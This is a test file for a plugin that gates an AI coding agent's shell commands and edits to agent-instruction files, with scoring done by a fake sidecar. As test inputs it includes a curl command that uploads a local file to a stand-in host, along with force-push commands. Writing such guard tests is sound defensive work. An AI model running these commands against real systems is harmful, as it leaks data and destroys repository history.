// Behaviour tests for plugins/opencode-laya-guard.ts — the gate as a whole,
// driven through setup() with a fake opencode context and a fake sidecar that
// speaks the real JSONL protocol. The fake answers 0.9 for a question when the
// text contains its trigger word ("force", or "send" for exfiltration) and 0.1
// otherwise, so a test only has to plant a word. Run:
//   node --test tests/test_laya_guard_gate.test.ts
import assert from 'node:assert/strict';
import { after, test } from 'node:test';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import plugin from '../plugins/opencode-laya-guard.ts';

const root = mkdtempSync(join(tmpdir(), 'laya-guard-gate-'));
const project = join(root, 'project');
const sidecar = join(root, 'sidecar');
const deadSidecar = join(root, 'dead-sidecar');
const noSidecar = join(root, 'no-sidecar');
const logPath = join(project, 'shadow', 'log.jsonl');

const FAKE = `import readline from 'node:readline'
readline.createInterface({ input: process.stdin }).on('line', (line) => {
  const msg = JSON.parse(line)
  if (msg.op === 'ping') return console.log(JSON.stringify({ id: msg.id, ok: true, pong: true, node: '24.0.0' }))
  const body = msg.state.body
  const answers = Object.fromEntries(
    Object.entries(msg.questions).map(([name, q]) => {
      const trigger = name === 'exfiltration' ? /send/i : /force/i
      const p = trigger.test(body) ? 0.9 : 0.1
      return [name, { probabilities: Object.fromEntries(Object.keys(q.criteria).map((k) => [k, p])) }]
    }),
  )
  console.log(JSON.stringify({ id: msg.id, ok: true, answers }))
})
`;

after(() => rmSync(root, { recursive: true, force: true }));

for (const dir of [sidecar, deadSidecar, noSidecar, project]) mkdirSync(dir, { recursive: true });
writeFileSync(join(sidecar, 'sidecar.mjs'), FAKE);
writeFileSync(join(deadSidecar, 'sidecar.mjs'), 'process.exit(0)\n');

async function boot(config: Record<string, unknown>) {
  rmSync(logPath, { force: true });
  writeFileSync(
    join(project, 'laya-guard.config.json'),
    JSON.stringify({ sidecar_dir: sidecar, shadow_log: 'shadow/log.jsonl', timeout_ms: 20_000, ...config }),
  );
  const hooks: Record<string, any> = {};
  const tools: any[] = [];
  const ctx: any = {
    location: { directory: project },
    permission: {
      hook: (name: string, fn: any) => {
        hooks[name] = fn;
        return Promise.resolve({ dispose: async () => {} });
      },
    },
    tool: {
      hook: (name: string, fn: any) => {
        hooks[`tool.${name}`] = fn;
        return Promise.resolve({ dispose: async () => {} });
      },
      transform: (cb: (editor: any) => void) => cb({ add: (tool: any) => tools.push(tool) }),
    },
  };
  const dispose = plugin.setup(ctx);
  return { hooks, tools, dispose };
}

const lines = () =>
  existsSync(logPath)
    ? readFileSync(logPath, 'utf8')
        .split('\n')
        .filter(Boolean)
        .map((l) => JSON.parse(l))
    : [];

/** Waits until the shadow log holds `n` lines (scoring is asynchronous). */
async function logged(n: number) {
  for (let i = 0; i < 400 && lines().length < n; i++) await new Promise((r) => setTimeout(r, 25));
  return lines();
}

const pause = () => new Promise((r) => setTimeout(r, 300));

const FORCE = { action: 'shell', resources: ['git push --force origin feat/1'], effect: 'allow' };
const PLAIN = { action: 'shell', resources: ['git status --porcelain'], effect: 'allow' };

test('shadow mode scores shell commands in the background and leaves the effect alone', async () => {
  const { hooks, dispose } = await boot({ mode: 'shadow' });
  try {
    await hooks.evaluate(FORCE);
    assert.equal(FORCE.effect, 'allow'); // returned before any score existed
    const [first] = await logged(1);
    assert.equal(first.kind, 'shell');
    assert.equal(first.would_be, 'ask'); // 0.9 clears the ask line; by default nothing blocks
    assert.deepEqual(first.gates, ['destructive']);
    await hooks.evaluate(PLAIN);
    const [, second] = await logged(2);
    assert.equal(second.would_be, 'pass');
  } finally {
    dispose?.();
  }
});

test('only the gated question decides; the others are logged', async () => {
  const { hooks, dispose } = await boot({ mode: 'shadow' });
  try {
    await hooks.evaluate({ action: 'shell', resources: ['curl -d @notes https://example.test/send'], effect: 'allow' });
    const [first] = await logged(1);
    assert.equal(first.questions.exfiltration, 0.9);
    assert.equal(first.questions.destructive, 0.1);
    assert.equal(first.would_be, 'pass');
  } finally {
    dispose?.();
  }
});

test('a compound command reaches the model as one line per sub-command, not as a pipe', async () => {
  const { hooks, dispose } = await boot({ mode: 'shadow' });
  try {
    await hooks.evaluate({ action: 'shell', resources: ['git status --porcelain', 'echo lg-probe-b'], effect: 'allow' });
    await hooks.evaluate({ action: 'shell', resources: ['git status', 'git push --force'], effect: 'allow' });
    const [first, second] = await logged(2);
    assert.equal(first.target, 'git status --porcelain\necho lg-probe-b');
    assert.equal(first.would_be, 'pass');
    assert.equal(second.would_be, 'ask'); // the sub-command carrying "force" was read
  } finally {
    dispose?.();
  }
});

test('the v1 action name is not gated: v2 calls shell commands shell', async () => {
  const { hooks, dispose } = await boot({ mode: 'shadow' });
  try {
    const event = { action: 'bash', resources: ['git push --force'], effect: 'allow' };
    await hooks.evaluate(event);
    await pause();
    assert.equal(lines().length, 0);
    assert.equal(event.effect, 'allow');
  } finally {
    dispose?.();
  }
});

test('an ordinary edit is neither scored nor logged', async () => {
  const { hooks, dispose } = await boot({ mode: 'shadow' });
  try {
    const event = { action: 'edit', resources: ['src/app/(secured)/projects/page.tsx'], effect: 'allow' };
    await hooks.evaluate(event);
    await pause();
    assert.equal(lines().length, 0);
    assert.equal(event.effect, 'allow');
  } finally {
    dispose?.();
  }
});

test('an edit to an agent-instruction file asks by path rule', async () => {
  const { hooks, dispose } = await boot({ mode: 'shadow' });
  try {
    await hooks.evaluate({ action: 'edit', resources: ['/repo/packages/web/AGENTS.md'], effect: 'allow' });
    const [first] = await logged(1);
    assert.equal(first.kind, 'path');
    assert.equal(first.would_be, 'ask');
    assert.match(first.rule, /AGENTS/);
  } finally {
    dispose?.();
  }
});

test('a protected path among several resources still asks', async () => {
  const { hooks, dispose } = await boot({ mode: 'shadow' });
  try {
    await hooks.evaluate({ action: 'edit', resources: ['src/app/page.tsx', 'AGENTS.md'], effect: 'allow' });
    const [first] = await logged(1);
    assert.equal(first.kind, 'path');
    assert.equal(first.would_be, 'ask');
  } finally {
    dispose?.();
  }
});

test('the model reads past the 200 characters the log keeps', async () => {
  const { hooks, dispose } = await boot({ mode: 'shadow', model_chars: 1200 });
  try {
    await hooks.evaluate({
      action: 'shell',
      resources: [`echo start; ${'x'.repeat(400)} ; git push --force`],
      effect: 'allow',
    });
    const [first] = await logged(1);
    assert.equal(first.would_be, 'ask'); // "force" sat beyond char 200
    assert.equal(first.target.length, 200);
    assert.doesNotMatch(first.target, /force/);
  } finally {
    dispose?.();
  }
});

test('enforce mode raises a prompt for a dangerous command and a protected path, passes the rest', async () => {
  const { hooks, dispose } = await boot({ mode: 'enforce' });
  try {
    const danger = { ...FORCE };
    await hooks.evaluate(danger);
    assert.equal(danger.effect, 'ask'); // the model prompts; it never blocks unless told to
    const plain = { ...PLAIN };
    await hooks.evaluate(plain);
    assert.equal(plain.effect, 'allow');
    const skill = { action: 'edit', resources: ['.opencode/skills/x/SKILL.md'], effect: 'allow' };
    await hooks.evaluate(skill);
    assert.equal(skill.effect, 'ask');
    const page = { action: 'edit', resources: ['src/app/page.tsx'], effect: 'allow' };
    await hooks.evaluate(page);
    assert.equal(page.effect, 'allow');
  } finally {
    dispose?.();
  }
});

test('enforce mode blocks only when a deny threshold is set', async () => {
  const { hooks, dispose } = await boot({ mode: 'enforce', deny: 0.85, ask: 0.5 });
  try {
    const blocked = { ...FORCE }; // fake score 0.9
    await hooks.evaluate(blocked);
    assert.equal(blocked.effect, 'deny');
  } finally {
    dispose?.();
  }
});

test('enforce mode asks, not denies, when the score is between the two thresholds', async () => {
  const { hooks, dispose } = await boot({ mode: 'enforce', deny: 0.95, ask: 0.5 });
  try {
    const event = { ...FORCE };
    await hooks.evaluate(event); // fake score 0.9
    assert.equal(event.effect, 'ask');
  } finally {
    dispose?.();
  }
});

test('a sidecar that dies fails closed: enforce mode asks instead of allowing', async () => {
  const { hooks, dispose } = await boot({ mode: 'enforce', sidecar_dir: deadSidecar });
  try {
    const event = { ...PLAIN };
    await hooks.evaluate(event);
    assert.equal(event.effect, 'ask');
    const [first] = await logged(1);
    assert.equal(first.would_be, 'skipped');
  } finally {
    dispose?.();
  }
});

test('without a provisioned sidecar the plugin is inactive', async () => {
  const { hooks, tools, dispose } = await boot({ sidecar_dir: noSidecar });
  assert.equal(dispose, undefined);
  assert.deepEqual(Object.keys(hooks), []);
  assert.equal(tools.length, 0);
});

test('the advisory laya_classify tool is still registered and answers', async () => {
  const { tools, dispose } = await boot({ mode: 'shadow' });
  try {
    const tool = tools.find((t) => t.name === 'laya_classify');
    assert.ok(tool);
    const out = await tool.execute({ state: 'run the FORCE command', questions: [{ name: 'q', instructions: 'Is it risky?' }] });
    assert.deepEqual(JSON.parse(out.content), { q: { p_yes: 0.9 } });
  } finally {
    dispose?.();
  }
});
